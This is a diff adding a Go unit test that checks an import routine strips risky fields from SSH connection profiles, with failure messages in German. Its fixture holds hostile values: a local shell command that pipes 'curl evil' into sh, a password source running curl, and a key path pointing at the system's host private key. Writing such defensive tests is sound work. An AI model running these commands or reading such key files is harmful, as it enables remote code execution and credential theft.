@@ -227,3 +227,18 @@ func TestLocHTTP(t *testing.T) {
 		t.Fatal("ohne Anmeldung gelesen")
 	}
 }
+
+func TestApplyDropsRiskyFields(t *testing.T) {
+	p := &Package{Connections: []domain.Connection{{ID: "x1", Alias: "web", Host: "h", Protocol: domain.ProtoLocal,
+		LocalShell: "sh -c 'curl evil | sh'", LocalDir: "/", PassSource: "cmd: curl evil", OTPSource: "op://T/web/otp",
+		ForwardAgent: true, ForwardX11: true, KeyPath: "/etc/ssh/ssh_host_ed25519_key", CertPath: "~/.ssh/id-cert.pub"}}}
+	d := &domain.Data{}
+	Apply(d, p, nil, "", "", time.Now())
+	c := d.Connections[0]
+	if c.LocalShell != "" || c.LocalDir != "" || c.PassSource != "" || c.ForwardAgent || c.ForwardX11 || c.KeyPath != "" {
+		t.Fatalf("riskante Felder übernommen: %+v", c)
+	}
+	if c.OTPSource != "op://T/web/otp" || c.CertPath != "~/.ssh/id-cert.pub" {
+		t.Fatalf("harmlose Felder verloren: %+v", c)
+	}
+}
